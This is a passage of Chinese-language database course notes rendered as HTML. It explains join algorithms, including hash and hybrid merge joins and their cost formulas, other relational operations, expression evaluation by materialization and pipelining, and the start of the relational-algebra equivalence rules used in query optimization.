<p><strong>混合合并连接</strong> 是排序合并连接的一个变种，适用于以下情况：一个关系已按连接属性排序，另一个关系在连接属性上有B+树索引</p>
<ol>
<li>按顺序扫描排序好的关系</li>
<li>对于每个元组，使用B+树索引查找匹配的元组</li>
<li>将结果按未排序关系的物理地址排序</li>
<li>顺序扫描未排序的关系，并与之前的结果合并，替换地址为实际元组</li>
</ol>
<p>这种方法结合了索引查找和排序合并的优点：</p>
<ul>
<li>避免了对两个关系都进行排序</li>
<li>利用已有的索引结构减少I/O操作</li>
<li>通过批处理和排序减少了随机I/O访问</li>
</ul>
<h3 id="note-db-query-hash-join">Hash Join<a class="headerlink" href="#note-db-query-hash-join" title="Permanent link">&para;</a></h3>
<figure>
<img alt="" src="../NOTE/DB/img/q7.png" width="500" />
</figure>
<p>哈希连接利用哈希函数将具有相同连接属性值的元组分配到相同的桶中：</p>
<ul>
<li>
<p>适用于等值连接和自然连接，通过哈希函数将元组分区，使具有相同连接属性值的元组分到同一个桶中,只需比较同一个桶中的元组，不需要跨桶比较</p>
</li>
<li>
<p>能够连接上的记录一定处于同一个桶，但是处于同一个桶的不一定可以连接的上</p>
</li>
</ul>
<h4 id="note-db-query-hash-function">Hash function<a class="headerlink" href="#note-db-query-hash-function" title="Permanent link">&para;</a></h4>
<ul>
<li>哈希函数 <span class="arithmatex">\(h\)</span> 用于对两个关系进行分区</li>
<li><span class="arithmatex">\(h\)</span> 将连接属性值映射到范围 <span class="arithmatex">\(\{0, 1, ..., n\}\)</span>，其中 <span class="arithmatex">\(n\)</span> 是分区数<ul>
<li><span class="arithmatex">\(r_0, r_1, ..., r_n\)</span> 表示关系 <span class="arithmatex">\(r\)</span> 的分区</li>
<li><span class="arithmatex">\(s_0, s_1, ..., s_n\)</span> 表示关系 <span class="arithmatex">\(s\)</span> 的分区</li>
</ul>
</li>
<li>关系 <span class="arithmatex">\(r\)</span> 中的元组 <span class="arithmatex">\(t_r\)</span> 被放入分区 <span class="arithmatex">\(r_i\)</span>，其中 <span class="arithmatex">\(i = h(t_r[JoinAttrs])\)</span></li>
<li>关系 <span class="arithmatex">\(s\)</span> 中的元组 <span class="arithmatex">\(t_s\)</span> 被放入分区 <span class="arithmatex">\(s_i\)</span>，其中 <span class="arithmatex">\(i = h(t_s[JoinAttrs])\)</span></li>
</ul>
<h4 id="note-db-query-attributes">Attributes<a class="headerlink" href="#note-db-query-attributes" title="Permanent link">&para;</a></h4>
<p>只有 <span class="arithmatex">\(r_i\)</span> 中的元组需要与 <span class="arithmatex">\(s_i\)</span> 中的元组比较，不需要与其他分区比较;原因：满足连接条件的元组必然有相同的连接属性值，因此会被哈希到相同的分区.如果连接属性值被哈希到值 <span class="arithmatex">\(i\)</span>，则关系 <span class="arithmatex">\(r\)</span> 的元组必须在分区 <span class="arithmatex">\(r_i\)</span>，关系 <span class="arithmatex">\(s\)</span> 的元组必须在分区 <span class="arithmatex">\(s_i\)</span></p>
<h4 id="note-db-query-algorithm_1">Algorithm<a class="headerlink" href="#note-db-query-algorithm_1" title="Permanent link">&para;</a></h4>
<p><strong>分区阶段</strong>：使用哈希函数 <span class="arithmatex">\(h\)</span> 对关系 <span class="arithmatex">\(s\)</span> 进行分区,类似地，对关系 <span class="arithmatex">\(r\)</span> 进行分区,分区时，为每个分区保留一个内存输出缓冲区</p>
<p><strong>连接阶段</strong>：对每个分区 <span class="arithmatex">\(i\)</span>：
   - (a) 将分区 <span class="arithmatex">\(s_i\)</span> 加载到内存并构建内存哈希索引（使用与 <span class="arithmatex">\(h\)</span> 不同的哈希函数）
   - (b) 读取分区 <span class="arithmatex">\(r_i\)</span> 中的元组，对每个元组使用内存哈希索引查找匹配的元组
   - <span class="arithmatex">\(c\)</span> 输出匹配的连接结果</p>
<h4 id="note-db-query-requirements">requirements<a class="headerlink" href="#note-db-query-requirements" title="Permanent link">&para;</a></h4>
<ul>
<li>分区数 <span class="arithmatex">\(n\)</span> 和哈希函数 <span class="arithmatex">\(h\)</span> 的选择应使每个分区 <span class="arithmatex">\(s_i\)</span> 能完全装入内存</li>
<li>通常 <span class="arithmatex">\(n\)</span> 选择为 <span class="arithmatex">\(\lceil b_s/M \rceil \times f\)</span>，其中：</li>
<li><span class="arithmatex">\(b_s\)</span> 是构建关系的块数,通常选择较小的关系(<span class="arithmatex">\(b_r&gt;b_s\)</span>)</li>
<li><span class="arithmatex">\(M\)</span> 是可用内存页数</li>
<li><span class="arithmatex">\(f\)</span> 是"修正因子"，通常在1.2左右</li>
</ul>
<h4 id="note-db-query-recursive-partitioning">recursive partitioning<a class="headerlink" href="#note-db-query-recursive-partitioning" title="Permanent link">&para;</a></h4>
<p>如果分区数 <span class="arithmatex">\(n\)</span> 大于可用内存页数 <span class="arithmatex">\(M\)</span>，则需要递归分区：</p>
<ul>
<li>使用 <span class="arithmatex">\(M-1\)</span> 个分区而不是 <span class="arithmatex">\(n\)</span> 个分区</li>
<li>使用不同的哈希函数对这 <span class="arithmatex">\(M-1\)</span> 个分区进行进一步分区</li>
<li>对大型分区重复分区过程，直到每个分区能装入内存</li>
</ul>
<p>在现代数据库系统中，递归分区很少需要：</p>
<ul>
<li>
<p>对于4KB块大小，2MB内存足以处理&lt;1GB的关系</p>
</li>
<li>
<p>12MB内存足以处理&lt;36GB的关系</p>
</li>
</ul>
<h4 id="note-db-query-handing-overflows">Handing overflows<a class="headerlink" href="#note-db-query-handing-overflows" title="Permanent link">&para;</a></h4>
<p>哈希表溢出发生在分区<span class="arithmatex">\(Hs_i\)</span>中，如果<span class="arithmatex">\(Hs_i\)</span>不适合内存。发生这种情况的原因有：</p>
<ul>
<li>许多元组在<span class="arithmatex">\(s\)</span>中具有相同的连接属性值（分区不均匀）</li>
<li>哈希函数不良，导致数据分布不均</li>
</ul>
<p>解决方案：</p>
<ul>
<li>通常选择<span class="arithmatex">\(f_h\)</span>为"调整因子"，大约1.2，来确定分区数量</li>
<li>溢出处理（递归分区）可以在构建阶段完成：</li>
<li>分区<span class="arithmatex">\(Hs_i\)</span>进一步使用不同的哈希函数进行分区</li>
<li>分区<span class="arithmatex">\(Hr_i\)</span>必须同样分区</li>
<li>溢出避免（避免溢出）在构建过程中谨慎执行分区：</li>
<li>例如，将构建关系分成许多分区，然后合并它们</li>
<li>如果出现大量重复项，两种方法都会失败：</li>
<li>备选方案：对溢出的连接属性值使用嵌套循环连接</li>
</ul>
<h3 id="note-db-query-cost-of-hash-join">Cost of Hash-Join<a class="headerlink" href="#note-db-query-cost-of-hash-join" title="Permanent link">&para;</a></h3>
<h4 id="note-db-query-no-recursive-partitioning">No recursive partitioning<a class="headerlink" href="#note-db-query-no-recursive-partitioning" title="Permanent link">&para;</a></h4>
<p>当内存足够大，能够容纳至少一个分区时，哈希连接的成本是：</p>
<ul>
<li>块传输次数：<span class="arithmatex">\(3(b_r + b_s) + 4 \times n_h\)</span></li>
<li>其中，<span class="arithmatex">\(n_h\)</span> 是哈希函数的分区数</li>
<li>
<p><span class="arithmatex">\(3(b_r + b_s)\)</span> 包含：读取两个关系一次（构建哈希表）+ 写入两个关系的分区 + 读取所有分区（执行连接）</p>
</li>
<li>
<p>寻道次数：<span class="arithmatex">\(2(\lceil b_r/b_B \rceil + \lceil b_s/b_B \rceil) + 2n_h\)</span></p>
</li>
<li>读取关系 + 写入分区 + 读取分区 </li>
</ul>
<div class="admonition info">
<p class="admonition-title">详细成本解释</p>
<p><strong>块传输次数</strong> <span class="arithmatex">\(3(b_r + b_s) + 4 \times n_h\)</span> 的详细分解：</p>
<ul>
<li><strong>分区阶段</strong>: <span class="arithmatex">\(2(b_r + b_s)\)</span> 块传输</li>
<li>
<p>写入分区: <span class="arithmatex">\(b_r + b_s\)</span> 块</p>
</li>
<li>
<p><strong>连接阶段</strong>: <span class="arithmatex">\(b_r + b_s\)</span> 块传输</p>
<ul>
<li>读取所有分区进行连接</li>
</ul>
</li>
<li>
<p><strong>部分填充块的开销</strong>: <span class="arithmatex">\(4 \times n_h\)</span> 块传输</p>
<ul>
<li>由于哈希分区可能导致部分填充的块</li>
<li>每个关系的每个分区可能有一个部分填充的块</li>
<li>每个分区需要写入和读取这些部分填充的块</li>
<li><span class="arithmatex">\(n_h\)</span> 个分区 <span class="arithmatex">\(\times\)</span> 2个关系 <span class="arithmatex">\(\times\)</span> (读+写) = <span class="arithmatex">\(4 \times n_h\)</span></li>
</ul>
</li>
</ul>
<p><strong>寻道次数</strong> <span class="arithmatex">\(2(\lceil b_r/b_B \rceil + \lceil b_s/b_B \rceil) + 2n_h\)</span> 的解释：</p>
<ul>
<li>
<p><strong>分区阶段</strong>: <span class="arithmatex">\(2(\lceil b_r/b_B \rceil + \lceil b_s/b_B \rceil)\)</span> 寻道</p>
<ul>
<li>假设输入缓冲区大小为 <span class="arithmatex">\(b_B\)</span> 块</li>
<li>读取关系 <span class="arithmatex">\(r\)</span> 需要 <span class="arithmatex">\(\lceil b_r/b_B \rceil\)</span> 次寻道</li>
<li>读取关系 <span class="arithmatex">\(s\)</span> 需要 <span class="arithmatex">\(\lceil b_s/b_B \rceil\)</span> 次寻道</li>
<li>写入分区也需要相同数量的寻道</li>
</ul>
</li>
<li>
<p><strong>连接阶段</strong>: <span class="arithmatex">\(2n_h\)</span> 寻道</p>
<ul>
<li>每个关系的每个分区只需一次寻道，因为可以顺序读取</li>
<li><span class="arithmatex">\(n_h\)</span> 个分区 <span class="arithmatex">\(\times\)</span> 2个关系 = <span class="arithmatex">\(2n_h\)</span> 次寻道</li>
</ul>
</li>
</ul>
</div>
<h4 id="note-db-query-recursive-partitioning_1">recursive partitioning<a class="headerlink" href="#note-db-query-recursive-partitioning_1" title="Permanent link">&para;</a></h4>
<p>当内存较小，需要递归分区时：</p>
<ul>
<li>递归分区的次数 <span class="arithmatex">\(s\)</span> 是 <span class="arithmatex">\(\lceil \log_{M-1}(b_s) - 1 \rceil\)</span>，其中 <span class="arithmatex">\(b_s\)</span> 是构建关系的块数</li>
<li>最好选择较小的关系作为构建关系</li>
</ul>
<p>总成本估计为：</p>
<ul>
<li>
<p>块传输次数：<span class="arithmatex">\(2(b_r + b_s)(\lceil \log_{M-1}(b_s) - 1 \rceil) + b_r + b_s\)</span>：读写每个关系 <span class="arithmatex">\(s\)</span> 次 + 最后读取一次进行连接</p>
</li>
<li>
<p>寻道次数：<span class="arithmatex">\(2(\lceil b_r/b_B \rceil + \lceil b_s/b_B \rceil)(\lceil \log_{M-1}(b_s) - 1 \rceil)\)</span></p>
</li>
</ul>
<h4 id="note-db-query-best-case">best case<a class="headerlink" href="#note-db-query-best-case" title="Permanent link">&para;</a></h4>
<p>如果整个构建输入可以保存在主内存中（不需要分区）：</p>
<ul>
<li>成本降低为 <span class="arithmatex">\(b_r + b_s\)</span>（最佳情况）</li>
<li>只需读取两个关系各一次</li>
</ul>
<h2 id="note-db-query-other-operations">Other Operations<a class="headerlink" href="#note-db-query-other-operations" title="Permanent link">&para;</a></h2>
<h3 id="note-db-query-duplicate-elimination">Duplicate Elimination<a class="headerlink" href="#note-db-query-duplicate-elimination" title="Permanent link">&para;</a></h3>
<p>重复消除可以通过哈希或排序实现：</p>
<h4 id="note-db-query-sorting_1">Sorting<a class="headerlink" href="#note-db-query-sorting_1" title="Permanent link">&para;</a></h4>
<ul>
<li>排序关系r，使重复元组相邻</li>
<li>扫描排序后的关系：将当前元组与前一个元组进行比较，只在不同时输出当前元组</li>
<li>优化：可以在外部排序-合并的运行生成阶段以及中间合并步骤中删除重复项</li>
</ul>
<h4 id="note-db-query-hashing">Hashing<a class="headerlink" href="#note-db-query-hashing" title="Permanent link">&para;</a></h4>
<ul>
<li>将元组哈希到不同的桶中，重复元组会进入相同的桶</li>
<li>在每个桶内识别并消除重复项</li>
</ul>
<p>成本（排序方法）= 排序关系的成本（如果关系已排序，则跳过此步骤）+ 关系扫描成本（<span class="arithmatex">\(b_r\)</span> 个块传输 + 1 次寻道）</p>
<h3 id="note-db-query-projection">Projection<a class="headerlink" href="#note-db-query-projection" title="Permanent link">&para;</a></h3>
<p>投影操作包含两个步骤：</p>
<ul>
<li>对每个元组执行属性投影</li>
<li>进行重复消除（除非我们知道不会有重复）</li>
</ul>
<p>如果只投影少量属性，生成的关系可能比原始关系小很多，这可以显著减少后续重复消除的成本。</p>
<h3 id="note-db-query-set-operations-cup-cap-">Set Operations (<span class="arithmatex">\(\cup\)</span>, <span class="arithmatex">\(\cap\)</span>, <span class="arithmatex">\(-\)</span>)<a class="headerlink" href="#note-db-query-set-operations-cup-cap-" title="Permanent link">&para;</a></h3>
<p>集合操作（<span class="arithmatex">\(\cup\)</span>, <span class="arithmatex">\(\cap\)</span>, <span class="arithmatex">\(-\)</span>）可以通过排序后的归并连接变体或哈希连接变体实现。</p>
<h4 id="note-db-query-_1">基于排序的集合操作<a class="headerlink" href="#note-db-query-_1" title="Permanent link">&para;</a></h4>
<ol>
<li>对两个关系按照相同的排序键进行排序</li>
<li>同时扫描两个排序后的关系，类似于归并连接</li>
<li>根据不同的集合操作执行相应的处理：<ul>
<li>并集(<span class="arithmatex">\(\cup\)</span>)：输出两个关系中的所有元组，但重复元组只输出一次</li>
<li>交集(<span class="arithmatex">\(\cap\)</span>)：只输出同时出现在两个关系中的元组</li>
<li>差集(<span class="arithmatex">\(-\)</span>)：只输出在第一个关系中但不在第二个关系中的元组</li>
</ul>
</li>
</ol>
<h4 id="note-db-query-_2">基于哈希的集合操作<a class="headerlink" href="#note-db-query-_2" title="Permanent link">&para;</a></h4>
<ol>
<li>使用相同的哈希函数对两个关系进行分区，创建 <span class="arithmatex">\(r_1\)</span>, <span class="arithmatex">\(r_2\)</span>, ..., <span class="arithmatex">\(r_n\)</span> 和 <span class="arithmatex">\(s_1\)</span>, <span class="arithmatex">\(s_2\)</span>, ..., <span class="arithmatex">\(s_n\)</span></li>
<li>对每个分区 <span class="arithmatex">\(i\)</span> 进行如下处理：<ul>
<li>使用不同的哈希函数，在将 <span class="arithmatex">\(r_i\)</span> 加载到内存后为其构建内存中的哈希索引</li>
<li>根据不同的集合操作处理 <span class="arithmatex">\(s_i\)</span>：<ul>
<li>并集(<span class="arithmatex">\(r \cup s\)</span>)：将 <span class="arithmatex">\(s_i\)</span> 中不在哈希索引中的元组添加到索引中，最后将哈希索引中的所有元组添加到结果中</li>
<li>交集(<span class="arithmatex">\(r \cap s\)</span>)：如果 <span class="arithmatex">\(s_i\)</span> 中的元组已存在于哈希索引中，则将其输出到结果中</li>
<li>差集(<span class="arithmatex">\(r - s\)</span>)：对于 <span class="arithmatex">\(s_i\)</span> 中的每个元组，如果它存在于哈希索引中，则从索引中删除；最后将哈希索引中剩余的元组添加到结果中</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>集合操作的成本分析与哈希连接或排序-归并连接类似，但通常更低，因为不需要连接匹配的元组。</p>
<h3 id="note-db-query-aggregation">Aggregation<a class="headerlink" href="#note-db-query-aggregation" title="Permanent link">&para;</a></h3>
<p>聚合操作可以采用类似于重复消除的方式实现。</p>
<p>可以使用排序或哈希将同一组的元组聚集在一起，然后对每个组应用聚合函数。</p>
<p>在运行生成和中间合并期间，通过计算部分聚合值来合并同一组中的元组：</p>
<ul>
<li>对于 count、min、max、sum：保持到目前为止在组中找到的元组的聚合值</li>
<li>当合并部分聚合值时，对于 count，将聚合值相加</li>
<li>对于 avg：保持 sum 和 count，并在最后用 sum 除以 count</li>
</ul>
<p>排序和哈希方法的实现与重复消除类似，但在处理每个组时应用相应的聚合函数。</p>
<h3 id="note-db-query-outer-join">Outer Join<a class="headerlink" href="#note-db-query-outer-join" title="Permanent link">&para;</a></h3>
<p>外连接（Outer Join）可以通过以下两种方式计算：</p>
<ol>
<li>
<p>先计算内连接，然后添加空值填充的非参与元组</p>
</li>
<li>
<p>修改连接算法</p>
</li>
</ol>
<h4 id="note-db-query-r-overrightarrowbowtie-s">修改归并连接计算外连接 <span class="arithmatex">\(r \, \overrightarrow{\bowtie} \, s\)</span><a class="headerlink" href="#note-db-query-r-overrightarrowbowtie-s" title="Permanent link">&para;</a></h4>
<ul>
<li>在 <span class="arithmatex">\(r \, \overrightarrow{\bowtie} \, s\)</span> 中，非参与元组是指在 <span class="arithmatex">\(r - \Pi_{r}(r \bowtie s)\)</span> 中的元组</li>
<li>修改归并连接计算 <span class="arithmatex">\(r \, \overrightarrow{\bowtie} \, s\)</span>：在归并过程中，对于来自 <span class="arithmatex">\(r\)</span> 的每个元组 <span class="arithmatex">\(t_r\)</span>，如果在 <span class="arithmatex">\(s\)</span> 中没有匹配的元组，则输出 <span class="arithmatex">\(t_r\)</span> 与空值填充的结果</li>
<li>右外连接和全外连接可以类似地计算</li>
</ul>
<h4 id="note-db-query-r-overrightarrowbowtie-s_1">修改哈希连接计算外连接 <span class="arithmatex">\(r \, \overrightarrow{\bowtie} \, s\)</span><a class="headerlink" href="#note-db-query-r-overrightarrowbowtie-s_1" title="Permanent link">&para;</a></h4>
<ul>
<li>如果 <span class="arithmatex">\(r\)</span> 是探测关系，输出未匹配的 <span class="arithmatex">\(r\)</span> 元组与空值填充</li>
<li>如果 <span class="arithmatex">\(r\)</span> 是构建关系，在探测阶段跟踪哪些 <span class="arithmatex">\(r\)</span> 元组匹配了 <span class="arithmatex">\(s\)</span> 元组。在探测结束时，输出未匹配的 <span class="arithmatex">\(r\)</span> 元组与空值填充</li>
</ul>
<h3 id="note-db-query-exaluation-of-expressions">Exaluation of Expressions<a class="headerlink" href="#note-db-query-exaluation-of-expressions" title="Permanent link">&para;</a></h3>
<h4 id="note-db-query-materialized-evaluation">Materialized Evaluation<a class="headerlink" href="#note-db-query-materialized-evaluation" title="Permanent link">&para;</a></h4>
<p>物化求值是一种逐步求值表达式的方法，从最底层操作开始，一次计算一个操作。</p>
<p>具体步骤：</p>
<ol>
<li>从关系代数表达式的最底层操作开始</li>
<li>将每个操作的结果物化（materialized）到临时关系中</li>
<li>使用这些临时关系来计算下一级操作</li>
</ol>
<p>例如，对于表达式 <span class="arithmatex">\(\Pi_{A}(\sigma_{C}(r \bowtie s))\)</span>：</p>
<ul>
<li>首先计算 <span class="arithmatex">\(temp1 = r \bowtie s\)</span></li>
<li>然后计算 <span class="arithmatex">\(temp2 = \sigma_{C}(temp1)\)</span></li>
<li>最后计算 <span class="arithmatex">\(result = \Pi_{A}(temp2)\)</span></li>
</ul>
<div class="admonition info">
<p class="admonition-title">物化求值的特点</p>
<ul>
<li>物化求值总是适用的</li>
<li>将结果写入磁盘并重新读取的成本可能相当高</li>
<li>我们对操作的成本公式忽略了将结果写入磁盘的成本</li>
<li>因此，总体成本 = 各个操作成本之和 + 将中间结果写入磁盘的成本</li>
</ul>
<p>改进方法：</p>
<ul>
<li><strong>双缓冲（Double buffering）</strong> ：为每个操作使用两个输出缓冲区，当一个缓冲区满时将其写入磁盘，同时另一个缓冲区正在填充</li>
<li>这允许磁盘写入与计算重叠，从而减少执行时间</li>
</ul>
</div>
<h4 id="note-db-query-pipelining">Pipelining<a class="headerlink" href="#note-db-query-pipelining" title="Permanent link">&para;</a></h4>
<p>流水线求值（Pipelining）是一种同时执行多个操作的方法，将一个操作的结果直接传递给下一个操作，而不需要物化中间结果。</p>
<p>具体特点：</p>
<ol>
<li>多个操作同时执行，形成一个处理流水线</li>
<li>一个操作的输出直接成为下一个操作的输入</li>
<li>避免了将中间结果写入磁盘的开销</li>
<li>减少了 I/O 操作和存储需求</li>
</ol>
<p>例如，对于表达式 <span class="arithmatex">\(\Pi_{A}(\sigma_{C}(r \bowtie s))\)</span>：
- 连接操作产生的元组直接传递给选择操作
- 选择操作的结果直接传递给投影操作
- 整个过程中不需要创建完整的中间关系</p>
<div class="admonition info">
<p class="admonition-title">流水线求值的优势</p>
<ul>
<li>比物化求值便宜得多：不需要将临时关系存储到磁盘</li>
<li>流水线处理可能并不总是可行（取决于下一个操作的类型，以及输出是否已排序等）</li>
<li>为了使流水线处理有效，需要使用能够在接收输入元组的同时生成输出元组的评估算法</li>
</ul>
<p>流水线可以通过两种方式执行：</p>
<ol>
<li><strong>需求驱动（Demand Driven）</strong> ：从上层操作开始，向下层操作请求数据</li>
<li><strong>生产者驱动（Producer Driven）</strong> ：从底层操作开始，将结果推送到上层操作</li>
</ol>
</div>
<h4 id="note-db-query-iterator-model">Iterator Model<a class="headerlink" href="#note-db-query-iterator-model" title="Permanent link">&para;</a></h4>
<p>迭代器模型是实现流水线处理的一种常见方法，它为每个关系代数操作符定义了三个主要函数：</p>
<ol>
<li>
<p><strong>Open()</strong> - 初始化操作</p>
<ul>
<li>例如，文件扫描：初始化文件扫描，将文件开头的指针存储为状态</li>
<li>例如，合并连接：对关系进行排序，并将排序后关系的开头指针存储为状态</li>
</ul>
</li>
<li>
<p><strong>Next()</strong> - 获取下一个元组</p>
<ul>
<li>例如，文件扫描：输出下一个元组，并前进和存储文件指针</li>
<li>例如，合并连接：从之前的状态继续合并，直到找到下一个输出元组，将指针保存为迭代器状态</li>
</ul>
</li>
<li>
<p><strong>Close()</strong> - 清理资源</p>
</li>
</ol>
<p>这种模型允许操作符以统一的方式进行交互，使得流水线处理变得简单高效。上层操作符通过调用下层操作符的Next()函数来获取输入数据，从而形成一个需求驱动的流水线。</p></section><section class="print-page" id="note-db-optimization" heading-number="2.2.1.10"><h1 id="note-db-optimization-query-optimization">Query Optimization<a class="headerlink" href="#note-db-optimization-query-optimization" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 3761 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 4 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 13 分钟</p>
</div>
<h2 id="note-db-optimization-transformation-of-relational-expressions">Transformation of Relational Expressions<a class="headerlink" href="#note-db-optimization-transformation-of-relational-expressions" title="Permanent link">&para;</a></h2>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<p>Two relational expressions are said to be equivalent  if the two expressions generate the same set of tuples on every legal database instance.</p>
<ul>
<li>The order of tuples is irrelevant.</li>
<li>we don't care if they generate different results on databases that violate integrity constraints</li>
</ul>
<p>即我们只关心查询在正确的数据库状态下的行为，而不需要考虑它在错误状态下的表现。</p>
<p>** An equivalence rule says that expressions of two forms are equivalent **</p>
</div>
<div class="admonition property">
<p class="admonition-title">Equivalence Rules</p>
<div class="tabbed-set tabbed-alternate" data-tabs="1:15"><input checked="checked" id="note-db-optimization-transformation-of-relational-expressions-rule1" name="note-db-optimization-__tabbed_1" type="radio" /><input id="note-db-optimization-transformation-of-relational-expressions-rule2" name="note-db-optimization-__tabbed_1" type="radio" /><input id="note-db-optimization-transformation-of-relational-expressions-rule3" name="note-db-optimization-__tabbed_1" type="radio" /><input id="note-db-optimization-transformation-of-relational-expressions-rule4" name="note-db-optimization-__tabbed_1" type="radio" /><input id="note-db-optimization-transformation-of-relational-expressions-rule5" name="note-db-optimization-__tabbed_1" type="radio" /><input id="note-db-optimization-transformation-of-relational-expressions-rule6a" name="note-db-optimization-__tabbed_1" type="radio" /><input id="note-db-optimization-transformation-of-relational-expressions-rule6b" name="note-db-optimization-__tabbed_1" type="radio" /><input id="note-db-optimization-transformation-of-relational-expressions-rule7a" name="note-db-optimization-__tabbed_1" type="radio" /><input id="note-db-optimization-transformation-of-relational-expressions-rule7b" name="note-db-optimization-__tabbed_1" type="radio" /><input id="note-db-optimization-transformation-of-relational-expressions-rule8a" name="note-db-optimization-__tabbed_1" type="radio" /><input id="note-db-optimization-transformation-of-relational-expressions-rule8b" name="note-db-optimization-__tabbed_1" type="radio" /><input id="note-db-optimization-transformation-of-relational-expressions-rule9" name="note-db-optimization-__tabbed_1" type="radio" /><input id="note-db-optimization-transformation-of-relational-expressions-rule10" name="note-db-optimization-__tabbed_1" type="radio" /><input id="note-db-optimization-transformation-of-relational-expressions-rule11" name="note-db-optimization-__tabbed_1" type="radio" /><input id="note-db-optimization-transformation-of-relational-expressions-rule12" name="note-db-optimization-__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="note-db-optimization-transformation-of-relational-expressions-rule1">rule1</label><label for="note-db-optimization-transformation-of-relational-expressions-rule2">rule2</label><label for="note-db-optimization-transformation-of-relational-expressions-rule3">rule3</label><label for="note-db-optimization-transformation-of-relational-expressions-rule4">rule4</label><label for="note-db-optimization-transformation-of-relational-expressions-rule5">rule5</label><label for="note-db-optimization-transformation-of-relational-expressions-rule6a">rule6.a</label><label for="note-db-optimization-transformation-of-relational-expressions-rule6b">rule6.b</label><label for="note-db-optimization-transformation-of-relational-expressions-rule7a">rule7.a</label><label for="note-db-optimization-transformation-of-relational-expressions-rule7b">rule7.b</label><label for="note-db-optimization-transformation-of-relational-expressions-rule8a">rule8.a</label><label for="note-db-optimization-transformation-of-relational-expressions-rule8b">rule8.b</label><label for="note-db-optimization-transformation-of-relational-expressions-rule9">rule9</label><label for="note-db-optimization-transformation-of-relational-expressions-rule10">rule10</label><label for="note-db-optimization-transformation-of-relational-expressions-rule11">rule11</label><label for="note-db-optimization-transformation-of-relational-expressions-rule12">rule12</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<p>合取式可以分解为多个选择运算符</p>
<div class="arithmatex">\[
    \sigma_{F_1 \land F_2}(R) = \sigma_{F_1}(\sigma_{F_2}(R))
\]</div>
</div>
<div class="tabbed-block">
<p>选择运算符可以交换</p>
<div class="arithmatex">\[
    \sigma_{F_1}(\sigma_{F_2}(R)) = \sigma_{F_2}(\sigma_{F_1}(R))
\]</div>
</div>
<div class="tabbed-block">
<p>连续投影，只有最后一个投影需要应用</p>
<div class="arithmatex">\[
    \Pi_{L_1}(\Pi_{L_2}(...\Pi_{L_n}(R)...)) = \Pi_{L_1}(R) \text{ where } L_1 \subseteq L_2 \subseteq ... \subseteq L_n
\]</div>
<p>e.g. <span class="arithmatex">\(\Pi_{A,B}(\Pi_{A,B,C,D}(R)) = \Pi_{A,B}(R)\)</span></p>
</div>
<div class="tabbed-block">
<p>选择操作可以和笛卡尔积和theta连接操作合并</p>
<div class="arithmatex">\[
    \sigma_{F}(R \times S) = R \bowtie_{F} S \\
    \sigma_{F_1}(R \bowtie_{F_2} S) = R \bowtie_{F_1 \land F_2} S
\]</div>
</div>
<div class="tabbed-block">
<p>自然连接和theta连接可以交换</p>
<div class="arithmatex">\[
    R \bowtie_{F} S = S \bowtie_{F} R
\]</div>
<p><figure markdown="span">
    <img alt="alt text" src="../NOTE/DB/img/rule5.png" width="400" />
</figure></p>
</div>
<div class="tabbed-block">
<p>自然连接有结合律</p>
<div class="arithmatex">\[
    (R \bowtie S) \bowtie T = R \bowtie (S \bowtie T)
\]</div>
<p><figure markdown="span">
    <img alt="alt text" src="../NOTE/DB/img/rule6a.png" width="400" />
</figure></p>
</div>
<div class="tabbed-block">
<p>theta连接有结合律，其中<span class="arithmatex">\(\theta_2\)</span>只包含<span class="arithmatex">\(S\)</span>和<span class="arithmatex">\(T\)</span>的属性</p>
<div class="arithmatex">\[
    (R \bowtie_{\theta_1} S) \bowtie_{\theta_2 \land \theta_3} T = R \bowtie_{\theta_1 \land \theta_3} (S \bowtie_{\theta_2} T)
\]</div>
</div>
<div class="tabbed-block">
<p>theta连接有分配律,假设<span class="arithmatex">\(\theta_0\)</span>只包含<span class="arithmatex">\(R\)</span>的属性</p>
<div class="arithmatex">\[
    \sigma_{\theta_0}(R \bowtie_{\theta} S) = \sigma_{\theta_0}(R) \bowtie_{\theta} S
\]</div>
<p><figure markdown="span">
    <img alt="alt text" src="../NOTE/DB/img/rule7a.png" width="400" />
</figure></p>
</div>
<div class="tabbed-block">
<p>theta连接有分配律,假设<span class="arithmatex">\(\theta_1\)</span>只包含<span class="arithmatex">\(S\)</span>的属性,<span class="arithmatex">\(\theta_2\)</span>只包含<span class="arithmatex">\(T\)</span>的属性</p>
<div class="arithmatex">\[
    \sigma_{\theta_1 \land \theta_2}(R \bowtie_{\theta} S) = \sigma_{\theta_1}(R) \bowtie_{\theta} \sigma_{\theta_2}(S)
\]</div>
<p>简单来说，就是先选后连接还是先连接后选，一般来说，先选后连接的效率更高。</p>
</div>
<div class="tabbed-block">
<p>投影操作的分配律,假设<span class="arithmatex">\(\theta\)</span>只包含<span class="arithmatex">\(L_1\)</span>和<span class="arithmatex">\(L_2\)</span>的属性</p>
<div class="arithmatex">\[
    \Pi_{L_1 \cup L_2}(R \bowtie_{\theta} S) = \Pi_{L_1}(R) \bowtie_{\theta} \Pi_{L_2}(S)
\]</div>
